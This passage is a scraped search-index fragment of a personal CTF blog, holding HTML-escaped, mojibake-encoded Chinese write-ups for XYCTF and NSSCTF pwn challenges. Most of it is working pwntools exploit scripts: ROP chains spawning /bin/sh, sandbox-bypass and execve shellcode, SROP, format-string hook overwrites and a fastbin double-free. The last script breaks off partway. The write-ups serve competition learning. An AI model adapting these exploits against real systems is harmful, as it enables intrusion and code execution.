">tutæ ¡èµ›</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/xyctf/"" data-c="
          &lt;h1 id=&#34;hello_world&#34;&gt;hello_world&lt;/h1&gt;
&lt;p&gt;ä¸¤æ¬¡æ ˆæº¢å‡ºï¼Œç¬¬ä¸€æ¬¡åˆ©ç”¨å­—ç¬¦ä¸²çš„æˆªæ–­æ³„éœ²å‡ºlibcåœ°å€ï¼Œç¬¬äºŒæ¬¡æ‹¿åˆ°shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./vuln&amp;quot;)
#p = remote(&amp;quot;xyctf.top&amp;quot;,44777)
elf = ELF(&amp;quot;./vuln&amp;quot;)
libc = elf.libc

pay = b&#39;a&#39;*0x28
p.sendafter(&amp;quot;name: &amp;quot;,pay)
gdb.attach(p)
base = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x29d90
print(&amp;quot;base = &amp;quot;,hex(base))
sys = base + 0x50D70
sh = base + 0x1D8678
ret = base + 0x0000000000029139
rdi = base + 0x000000000002a3e5
pay += p64(ret) + p64(rdi) + p64(sh) + p64(sys)
gdb.attach(p)
p.sendafter(&amp;quot;please input your name: &amp;quot;,pay)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;inviisible_flagç¦ç”¨äº†orwçš„orw&#34;&gt;inviisible_flagï¼ˆç¦ç”¨äº†orwçš„orwï¼‰&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1714558976331.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1714559012916.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç¨‹åºä¼šæ‰§è¡Œè¾“å…¥çš„shellcodeï¼Œå¼€äº†æ²™ç›’ç¦ç”¨äº†execveå’Œorwï¼Œç¦ç”¨openå¯ä»¥ç”¨openatç»•è¿‡ï¼Œç¦ç”¨readå‡½æ•°å¯ä»¥ç”¨preadç»•è¿‡ï¼Œåé¢ç¦ç”¨writeæˆ‘ç”¨çš„æµ‹ä¿¡é“çˆ†ç ´ï¼Œçœ‹äº†wpå‘ç°sendfile64 (è°ƒç”¨å·:0x28)å¯ä»¥ç›´æ¥è®©ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦çš„å†…å®¹è¾“å‡ºåˆ°å¦ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸Šéå¸¸é€‚åˆå¹³æ›¿è¿™æ¬¡çš„writeå‡½æ•°&lt;/p&gt;
&lt;h2 id=&#34;æµ‹ä¿¡é“çˆ†ç ´&#34;&gt;æµ‹ä¿¡é“çˆ†ç ´&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./vuln&amp;quot;)
#p = remote(&amp;quot;xyctf.top&amp;quot;,44777)
#elf = ELF(&amp;quot;./vuln&amp;quot;)
#libc = elf.libc

#openat(0xffffff9c,flag,0)
#pread(3,0x114514000,0x100,0)
payload = asm(&#39;&#39;&#39;
	mov rax, 0x67616c66
	push rax
	mov rdi, 0xffffff9c
	mov rsi,rsp
	xor rdx,rdx
	mov rax,257
	syscall
	&#39;&#39;&#39;)
payload += asm(shellcraft.pread(3,0x114514000,0x100,0))	

def exp(dis,char):
	pay = payload	
	pay += asm(&#39;&#39;&#39;
	mov dl, byte ptr [rsi+{}]
        mov cl, {}
        cmp cl,dl
        jz loop
        mov al,60
        syscall
        loop:
        jmp loop
	&#39;&#39;&#39;.format(dis,char))
	p.sendafter(&amp;quot;again\n&amp;quot;,pay)

flag = &amp;quot;&amp;quot;

for i in range(len(flag),50):
	sleep(1)
	print(&amp;quot;flag : {}&amp;quot;.format(flag))
	for j in range(0x20,0x80):
		#p = remote(&amp;quot;xyctf.top&amp;quot;,45966)
		p = process(&amp;quot;./vuln&amp;quot;)
		#gdb.attach(p)
		try:
			exp(i,j)
			p.recvline(timeout=1)
			flag += chr(j)
			print(&amp;quot;flag : &amp;quot;,flag)
			log.success(&amp;quot;{} pos : {} success&amp;quot;.format(i,chr(j)))
			p.close()
			break
		except:           
			p.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;sendfileç»•è¿‡&#34;&gt;sendfileç»•è¿‡&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./vuln&amp;quot;)
#p = remote(&amp;quot;xyctf.top&amp;quot;,44777)
elf = ELF(&amp;quot;./vuln&amp;quot;)
libc = elf.libc

payload = asm(shellcraft.openat(0xffffff9c,b&amp;quot;flag&amp;quot;,0))	
#payload = asm(shellcraft.openat(-100,b&amp;quot;flag&amp;quot;,0))	
#-100 AT_FDCWD è¡¨ç¤ºå½“å‰ç›®å½•
payload += asm(shellcraft.pread(3,0x114514000,0x100,0))	
payload += asm(shellcraft.sendfile(1,3,0,0x100))

p.sendafter(&amp;quot;again\n&amp;quot;,payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;static_link&#34;&gt;static_link&lt;/h1&gt;
&lt;p&gt;ä¾¥å¹¸æ‹¿äº†ä¸ªä¸€è¡€ğŸ˜‹ï¼Œé™æ€ç¼–è¯‘ç›´æ¥ç”Ÿæˆropchain&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from ctypes import *
from pwn import *
io = process(&#39;./vuln&#39;)
#io = remote(&amp;quot;xyctf.top&amp;quot;,50075)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
elf = ELF(&#39;./vuln&#39;)


from struct import pack

# Padding goes here
p = b&#39;&#39;

p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000409f8e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000447fe7) # pop rax ; ret
p += b&#39;/bin//sh&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044a465) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000409f8e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000043d1b0) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044a465) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000401f1f) # pop rdi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000409f8e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000451322) # pop rdx ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000043d1b0) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000447fe7) # pop rax ; ret
p += p64(59)
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000401cd4) # syscall

pay = b&#39;&#39;
#
for i in range(len(p)):
        pay += (ord(p[i:i+1])).to_bytes(1)
payload = b&#39;a&#39;*40 + pay
gdb.attach(p)
io.sendafter(b&#39;ret2??\n&#39;, payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;babygift&#34;&gt;BabyGift&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1714560701006.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1714560819606.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å­˜åœ¨æ ˆæº¢å‡ºï¼ŒæŸ¥çœ‹æ±‡ç¼–å‘ç°ç¨‹åºç»“æŸæ—¶rdiæŒ‡å‘ç¬¬äºŒæ¬¡è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œæ§åˆ¶ç¨‹åºç»“æŸæ—¶è°ƒç”¨printfå‡½æ•°ä¾¿å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²å‡ºæ ˆåœ°å€å’Œlibcåœ°å€ï¼Œå†è°ƒç”¨mainå‡½æ•°ï¼Œæ§åˆ¶ç¬¬äºŒæ¬¡è¾“å…¥çš„å­—ç¬¦ä¸²ä¸º/bin/shï¼Œè°ƒç”¨systemå‡½æ•°å³å¯æ‹¿åˆ°shellï¼ˆå¶å°”printfå‡½æ•°è°ƒç”¨å¤±è´¥ï¼Œå¤šè¯•å‡ æ¬¡å°±å¯ï¼‰&lt;/p&gt;
&lt;h2 id=&#34;ä»¤äººç–‘æƒ‘çš„æ˜¯&#34;&gt;ä»¤äººç–‘æƒ‘çš„æ˜¯&lt;/h2&gt;
&lt;p&gt;åˆšå¼€å§‹åšæ—¶æ²¡æœ‰æ³„éœ²æ ˆåœ°å€ï¼ŒæŠŠæ ˆç›´æ¥æ”¾åœ¨bssæ®µäº†ï¼Œä¹Ÿè°ƒç”¨systemå‡½æ•°äº†ï¼Œä½†æ˜¯è°ƒç”¨posix_spawnååˆ›å»ºçš„å­è¿›ç¨‹å°±è«åå…¶å¦™ä¸­æ­¢äº†ï¼ŒæŠŠposix_spawnçš„å‚æ•°å’Œèƒ½æ­£å¸¸å¾—åˆ°shellçš„å‚æ•°æ¯”è¾ƒåæ„Ÿè§‰æ²¡å•¥å·®å¼‚ï¼Œæ„Ÿè§‰å¯èƒ½æ˜¯åœ¨åˆ›å»ºå­è¿›ç¨‹æ—¶å¯¹æ ˆçš„ä½œç”¨ä½¿å¾—bssæ®µä¸­æŸäº›ä¸èƒ½æ”¹çš„ä¸œè¥¿æ”¹äº†ï¼ŒæŠŠæ ˆæ”¾å›åŸä½å°±æˆåŠŸæ‹¿åˆ°shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from ctypes import *
from pwn import *
for i in range(50):
	try:
		p = process(&#39;./vuln&#39;)
		#p = remote(&amp;quot;xyctf.top&amp;quot;,41584)
		context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
		elf = ELF(&#39;./vuln&#39;)

		#gdb.attach(p)
		printf = 0x401080
		ret = 0x000000000040101a
		main = 0x40126A
		pay = b&#39;a&#39;*32
		p.sendafter(&amp;quot;name:\n&amp;quot;,pay)

		payload = b&#39;aa%25$p-%26$p&#39;
		p.sendafter(&amp;quot;Your passwd:\n&amp;quot;,payload.ljust(31,b&#39;b&#39;) + p64(0x404000 + 0x600) + p64(ret) + p64(printf) + p64(main))

		p.recvuntil(b&#39;0x&#39;)
		__libc_start_main = int(p.recv(12),16) - 128
		base = __libc_start_main - 0x29DC0
		print(&amp;quot;base = &amp;quot;,hex(base))
		sys = base + 0x50D70
		
		p.recvuntil(b&#39;0x&#39;)
		stack = int(p.recv(12),16)
		print(&amp;quot;stack = &amp;quot;,hex(stack))

		#gdb.attach(p)
		#one = base + 0xebd43
		payload1 = b&amp;quot;;/bin/sh&amp;quot;*3 + b&#39;a&#39;*7+ p64(stack-0x100+11*8) + p64(0x401288)
		p.sendline(payload1)
		
		
		payload2 = b&amp;quot;/bin/sh\x00&amp;quot;*4 + b&#39;a&#39;*8
		p.sendline(payload2 + p64(ret) + p64(sys))
		p.interactive()
	except:           
		p.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;guestbook&#34;&gt;GuestBook&lt;/h1&gt;
&lt;p&gt;æ§åˆ¶rspæœ€åä¸€ä½ï¼Œåœ¨æ ˆä¸Šæå‰å†™å¥½åé—¨å‡½æ•°ï¼Œå¾ˆå®¹æ˜“æ ˆè¿ç§»åˆ°åé—¨å‡½æ•°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

for i in range(50):
	try:
		#p = process(&amp;quot;./pwn&amp;quot;)
		p = remote(&amp;quot;xyctf.top&amp;quot;,60462)
		elf = ELF(&amp;quot;./pwn&amp;quot;)
		libc = elf.libc

		#gdb.attach(p)
		sys = 0x40132B
		p.sendlineafter(&amp;quot;index\n&amp;quot;,b&#39;32&#39;)
		p.sendlineafter(&amp;quot;name:\n&amp;quot;,p64(sys)*2)
		p.sendlineafter(&amp;quot;id:\n&amp;quot;,b&#39;32&#39;)
		p.sendlineafter(&amp;quot;index\n&amp;quot;,b&#39;-1&#39;)
		p.interactive()	
	except:           
		p.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;simple_sropsropå’Œorw&#34;&gt;simple_sropï¼ˆsropå’Œorwï¼‰&lt;/h1&gt;
&lt;p&gt;ç¨‹åºåªæœ‰ä¸€ä¸ªæº¢å‡ºäº†å¾ˆå¤šçš„readï¼Œç¨‹åºç»™çš„readçš„é•¿åº¦æˆ‘æ€•ä¸è¿‡ï¼Œæ‰€ä»¥å…ˆè°ƒç”¨readå‡½æ•°åœ¨bssæ®µå†™ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å¾—çŸ¥&amp;quot;./flag&amp;quot;å­—ç¬¦ä¸²çš„åœ°å€,ä¸€ä¸ªsigframeæ˜¯256ä¸ªå­—èŠ‚ï¼ˆè°ƒè¯•å‡ºæ¥çš„ï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./vuln&amp;quot;)
p = remote(&amp;quot;192.168.43.159&amp;quot;,62578)
elf = ELF(&amp;quot;./vuln&amp;quot;)

syscall = 0x40129d
bss = 0x404000 + 0x500
srop = 0x401297

#gdb.attach(p)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = bss
sigframe.rsp = bss + 0x10
sigframe.rdx = 0x1000
sigframe.rip = syscall

payload = b&amp;quot;a&amp;quot;*32 + p64(0) + p64(srop) + bytes(sigframe)
p.send(payload)
#pause()
sh = bss
flag = bss + 8
sigframe0 = SigreturnFrame()
sigframe0.rax = constants.SYS_open
sigframe0.rdi = flag
sigframe0.rsi = 0
sigframe0.rsp = bss + 0x10 + 256
sigframe0.rdx = 0
sigframe0.rip = syscall

sigframe1 = SigreturnFrame()
sigframe1.rax = constants.SYS_read
sigframe1.rdi = 3
sigframe1.rsi = bss - 0x100
sigframe1.rsp = bss + 0x10 + 256*2
sigframe1.rdx = 0x100
sigframe1.rip = syscall


sigframe2 = SigreturnFrame()
sigframe2.rax = constants.SYS_write
sigframe2.rdi = 1
sigframe2.rsi = bss - 0x100
sigframe2.rsp = bss + 0x10 + 256*3
sigframe2.rdx = 0x100
sigframe2.rip = syscall

pay = b&amp;quot;/bin/sh\00&amp;quot; + b&amp;quot;./flag\x00\x00&amp;quot; + p64(srop) + bytes(sigframe0) + p64(srop) + bytes(sigframe1) + p64(srop) + bytes(sigframe2)
p.send(pay)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;fmt&#34;&gt;fmt&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1714562839765.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¼€å±€é€ä½ libcåœ°å€ï¼Œè¿˜æœ‰åé—¨å‡½æ•°ï¼Œç„¶åæœ‰ä¸ªscanfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼Œæ²¡æœ‰æ ˆåœ°å€æ‰€ä»¥æ²¡æ³•æ”¹è¿”å›åœ°å€ï¼Œå¯ä»¥æ‰“exit hookï¼Œå­¦ä¹ é“¾æ¥ï¼š&lt;a href=&#34;https://www.cnblogs.com/pwnfeifei/p/15759130.html&#34;&gt;https://www.cnblogs.com/pwnfeifei/p/15759130.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;ç”±æ­¤æˆ‘ä»¬å¯ä»¥æƒ³åˆ°ä¸¤ä¸ªæ–¹æ³•æ¥-get-shell&#34;&gt;ç”±æ­¤æˆ‘ä»¬å¯ä»¥æƒ³åˆ°ä¸¤ä¸ªæ–¹æ³•æ¥ get shell&lt;/h2&gt;
&lt;p&gt;1.ä¸€ä¸ªæ˜¯æ”¹ rtld_lock_default_lock_recursive æˆ– rtld_lock_default_unlock_recursive ä¸º one_gadget&lt;br&gt;
2.å¦ä¸€ä¸ªæ›´é€šç”¨å°±æ˜¯æ”¹ rtld_lock_default_lock_recursive å’Œrtld_lock_default_unlock_recursive ä¸º system ï¼Œå¹¶ä¸”æŠŠ _rtld_global._dl_load_lock.mutexçš„å€¼æ”¹ä¸º /bin/sh\x00&lt;/p&gt;
&lt;h2 id=&#34;æ‰¾hookåç§»&#34;&gt;æ‰¾hookåç§»&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;p _rtld_global&lt;/code&gt;å‘½ä»¤ï¼Œä½†è¿™é“é¢˜è¿™ä¸ªå‘½ä»¤è²Œä¼¼ä¸å¤ªç®¡ç”¨ï¼Œåœ¨ç½‘ä¸Šç¡¬æ‰¾åˆ°äº†åç§»ï¼Œæœ¬åœ°2.31çš„_rtld_globalåœ°å€ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x7ffff7ffdf60 &amp;lt;_rtld_global+3840&amp;gt;:    0x0000000000000000    0x00007ffff7fd0150
0x7ffff7ffdf70 &amp;lt;_rtld_global+3856&amp;gt;:    0x00007ffff7fd0160    0x0000000000000000
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./vuln&amp;quot;)
#p = remote(&amp;quot;192.168.163.1&amp;quot;,52045)
elf = ELF(&amp;quot;./vuln&amp;quot;)
ld = ELF(&amp;quot;./vuln&amp;quot;)
libc = elf.libc
sys = 4199110#0x4012C6
system = 4198560#0x4010A0
sh = 4202558#0x40203E

gdb.attach(p)
p.recvuntil(b&amp;quot;0x&amp;quot;)
base = int(p.recv(12),16) - 0x61CC0
print(&amp;quot;base = &amp;quot;,hex(base)) #
ld_base = base + 2236416
print(&amp;quot;ld_base = &amp;quot;,hex(ld_base))
_dl_rtld_lock_recursive = ld_base + 0xf60 + 8
_dl_rtld_unlock_recursive = _dl_rtld_lock_recursive + 8
_dl_load_lock = _dl_rtld_unlock_recursive - 0x608
__libc_atexit = base + 0x1ED608

onegadget = [0xe3b2e,0xe3b31,0xe3b34]
one_gadget = base + onegadget[0]

p.sendline(b&amp;quot;%8$lld%9$lldaaaa&amp;quot; + p64(_dl_rtld_lock_recursive) + p64(_dl_load_lock))

pause()
p.sendline(str(system) + &amp;quot; &amp;quot; + str(sh))

p.interactive()

#0xe3b2e execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
#constraints:
#  [r15] == NULL || r15 == NULL || r15 is a valid argv
#  [r12] == NULL || r12 == NULL || r12 is a valid envp

#0xe3b31 execve(https://l1u66.github.io//post-images/1714566464339.png)
#constraints:
#  [r15] == NULL || r15 == NULL || r15 is a valid argv
#  [rdx] == NULL || rdx == NULL || rdx is a valid envp
#
#0xe3b34 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
#constraints:
#  [rsi] == NULL || rsi == NULL || rsi is a valid argv
#  [rdx] == NULL || rdx == NULL || rdx is a valid envp
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;malloc_flag&#34;&gt;malloc_flag&lt;/h1&gt;
&lt;p&gt;é¢ï¼Œç”³è¯·ä¸€ä¸ª0x100çš„å †å—ï¼Œç„¶åshowå°±æœ‰flag....ç”šè‡³ä¸ç”¨å†™è„šæœ¬&lt;/p&gt;
&lt;h1 id=&#34;intermittent&#34;&gt;Intermittent&lt;/h1&gt;
&lt;p&gt;ç¨‹åºæŠŠè¾“å…¥çš„shellcodeå‰12ä¸ªå­—èŠ‚æ¯å››ä¸ªå­—èŠ‚å¼„ä¸€èµ·&lt;br&gt;
å¦‚å›¾&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1714566572863.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1714566393411.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;rep-movsbæŒ‡ä»¤&#34;&gt;rep movsbæŒ‡ä»¤&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªæŒ‡ä»¤å¯ä»¥è®©rsiå¯„å­˜å™¨çš„åœ°å€å¼€å§‹rcxçš„å­—èŠ‚æ•°æ®èµ‹å€¼ç»™rdiåœ°å€æ‰€&lt;br&gt;
æŒ‡çš„åŒºåŸŸ&lt;br&gt;
è¯¥é¢˜å¯ä»¥é€šè¿‡æ ˆï¼ˆä¸¤ä¸ªå­—èŠ‚ï¼Œåœ¨rdiä¸­å†™å…¥rdxä¸­çš„0x114514000ï¼‰ï¼Œä»è€Œå†™å…¥è¿ç»­çš„shellcode&lt;/p&gt;
&lt;h2 id=&#34;mov-movabsåŒºåˆ«&#34;&gt;mov movabsåŒºåˆ«&lt;/h2&gt;
&lt;p&gt;movabs å’Œ mov æ˜¯ x86 æ±‡ç¼–è¯­è¨€ä¸­çš„ä¸¤æ¡æŒ‡ä»¤ï¼Œç”¨äºå°†æ•°æ®ä»ä¸€ä¸ªä½ç½®ç§»åŠ¨åˆ°å¦ä¸€ä¸ªä½ç½®ã€‚å®ƒä»¬çš„åŒºåˆ«åœ¨äºæ“ä½œæ•°çš„å¤§å°å’ŒèŒƒå›´ã€‚&lt;br&gt;
1.mov æŒ‡ä»¤åªèƒ½ç”¨äºå°†æ•°æ®ä»ä¸€ä¸ªå¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ç§»åŠ¨åˆ°å¦ä¸€ä¸ªå¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ã€‚å®ƒå¯ä»¥å¤„ç† 8 ä½ã€16 ä½ã€32 ä½æˆ– 64 ä½çš„æ•°æ®ã€‚&lt;br&gt;
2.movabs æŒ‡ä»¤æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºå¤„ç† 64 ä½æ•°æ®çš„æŒ‡ä»¤ï¼Œå®ƒç”¨äºå°† 64 ä½æ•°æ®ç›´æ¥åŠ è½½åˆ°å¯„å­˜å™¨ä¸­ï¼Œè€Œä¸éœ€è¦ä½¿ç”¨å…¶ä»–å¯„å­˜å™¨ä½œä¸ºä¸­é—´ä¼ é€’ã€‚è¿™ä¸ªæŒ‡ä»¤é€šå¸¸ç”¨äºå¤„ç†è¶…è¿‡ 32 ä½çš„æ•´æ•°æˆ–åœ°å€ã€‚&lt;br&gt;
å› æ­¤ï¼Œmovabs æŒ‡ä»¤ä¸»è¦ç”¨äºå¤„ç† 64 ä½æ•°æ®ï¼Œè€Œ mov æŒ‡ä»¤å¯ä»¥ç”¨äºå¤„ç†ä¸åŒå¤§å°çš„æ•°æ®ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./vuln&amp;quot;)
#p = remote(&amp;quot;xyctf.top&amp;quot;,44777)
elf = ELF(&amp;quot;./vuln&amp;quot;)
libc = elf.libc

#gdb.attach(p)
shellcode1 = b&#39;\x52\x5F\xF3\xA4&#39;
shellcode = shellcode1+b&amp;quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&amp;quot;

p.send(shellcode.ljust(0x100,b&amp;quot;\x90&amp;quot;))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ–è€…&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x0000000000000000:  52       push    rdx
0x0000000000000001:  5E       pop     rsi
0x0000000000000002:  0F 05    syscall 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æé™è°ƒç”¨readå†æ¬¡è¯»å–shellcode&lt;/p&gt;
&lt;h1 id=&#34;fastfastfastdouble-free&#34;&gt;fastfastfastï¼ˆdouble freeï¼‰&lt;/h1&gt;
&lt;p&gt;2.31çš„libcï¼Œå­˜åœ¨uafè€ƒè™‘fast bin double free,åŠ«æŒmalloc hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./vuln&amp;quot;)
#p = remote(&amp;quot;xyctf.top&amp;quot;,44777)
elf = ELF(&amp;quot;./vuln&amp;quot;)
libc = elf.libc

def add(idx,data):
	p.sendlineafter(&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;, &amp;quot;1&amp;quot;)
	p.sendlineafter(&amp;quot;idx\n&amp;quot;, str(idx))
	p.sendafter(&amp;quot;content\n&amp;quot;, data)
    	
def dele(idx):
	p.sendlineafter(&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;, &amp;quot;2&amp;quot;)
	p.sendlineafter(&amp;quot;idx\n&amp;quot;, str(idx))

def view(idx):
	p.sendlineafter(&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;, &amp;quot;3&amp;quot;)
	p.sendlineafter(&amp;quot;idx\n&amp;quot;, str(idx))
	
#gdb.attach(p)
for i in range(0xf):
	add(i,b&#39;a&#39;*8)
for i in range(8):
	dele(i)
dele(8)
dele(7)
for i in range(7):
	add(i,b&#39;a&#39;*8)
add(9,p64(0x404070))

add(10,b&#39;b&#39;)
add(11,b&#39;c&#39;)
add(12,b&#39;\x00&#39;)

view(12)
base = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;)) - 2021024
print(&amp;quot;base = &amp;quot;,hex(base))
#pause()
onegadget = [0xe3b2e,0xe3b31,0xe3b34]
one_gadget = base + onegadget[1]
malloc_hook = base + (0x7f291e7a2b70-0x7f291e5b6000 )

for i in range(0xf):
	add(i,b&#39;a&#39;*8)
for i in range(8):
	dele(i)
dele(8)
dele(7)

for i in range(7):
	add(i,p64(0))

add(9,p64(malloc_hook))

add(10,b&#39;b&#39;)
add(11,b&#39;c&#39;)
print(&amp;quot;malloc_hook = &amp;quot;,hex(malloc_hook))
#pause()
add(12,p64(one_gadget))
p.sendlineafter(&amp;quot;&amp;gt;&amp;gt;&amp;gt; &amp;quot;, &amp;quot;1&amp;quot;)
p.sendlineafter(&amp;quot;idx\n&amp;quot;, str(1))
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">XYCTF</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/nssctf-round21-basic/"" data-c="
          &lt;h1 id=&#34;fmt_checkin&#34;&gt;fmt_checkin&lt;/h1&gt;
&lt;p&gt;ç»å…¸æ ¼å¼åŒ–å­—ç¬¦ä¸²,å­˜åœ¨systemå‡½æ•°ï¼Œå°†printfçš„gotè¡¨æ¢æˆsystemçš„pltè¡¨å³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from ctypes import *
from pwn import *

#p = process(&#39;./fmt_checkin&#39;)
p = remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28679)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
elf = ELF(&#39;./fmt_checkin&#39;)

#gdb.attach(p)
sys = 0x401265
p.sendlineafter(&amp;quot;send\n&amp;quot;,b&#39;-1&#39;)
p.sendlineafter(&amp;quot;payload\n&amp;quot;,b&amp;quot;%13$p&amp;quot;)
p.recvuntil(b&amp;quot;0x&amp;quot;)
stack = int(p.recv(12),16) - 272 + 16
print(&amp;quot;stack = &amp;quot;,stack)
s1 = stack &amp;amp; 0xffff
p.sendlineafter(&amp;quot;payload\n&amp;quot;,b&amp;quot;%&amp;quot; + str(s1).encode(&amp;quot;utf-8&amp;quot;) + b&amp;quot;c%13$hn&amp;quot;)
p.sendlineafter(&amp;quot;payload\n&amp;quot;,b&amp;quot;%16440c%43$hn&amp;quot;)
p.sendlineafter(&amp;quot;payload\n&amp;quot;,b&amp;quot;%4198624c%11$ln&amp;quot;)
